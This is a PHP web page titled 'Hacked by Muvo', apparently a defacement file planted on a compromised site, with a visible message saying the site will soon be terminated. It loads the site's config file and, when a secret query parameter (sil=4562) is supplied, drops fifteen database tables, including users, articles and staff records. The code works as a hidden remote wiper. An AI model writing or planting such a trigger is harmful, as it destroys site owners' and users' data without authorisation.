<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport"
          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <!-- CSS only -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta1/dist/css/bootstrap.min.css" rel="stylesheet"  crossorigin="anonymous">
    <title>Hacked by Muvo</title>
</head>
<body>
<?php
include "ayarlar.php";
if ($_GET['sil']==4562)
{
    $sql = $db->query('DROP table about;');
    $sql = $db->query('DROP table about_counter;');
    $sql = $db->query('DROP table articles;');
    $sql = $db->query('DROP table contactinfo;');
    $sql = $db->query('DROP table events;');
    $sql = $db->query('DROP table kullanicilar;');
    $sql = $db->query('DROP table partners;');
    $sql = $db->query('DROP table portfolio;');
    $sql = $db->query('DROP table services;');
    $sql = $db->query('DROP table slider;');
    $sql = $db->query('DROP table social_media;');
    $sql = $db->query('DROP table staff_volunteers;');
    $sql = $db->query('DROP table stories;');
    $sql = $db->query('DROP table teams;');
    $sql = $db->query('DROP table videos;');

}
?>

<div class="container">
    <div class="row">
        <div class="col-md-12">
            <p style="font-weight: bold">This site ll be terminated soon permanently...</p>
        </div>
    </div>
</div>
</body>
</html>
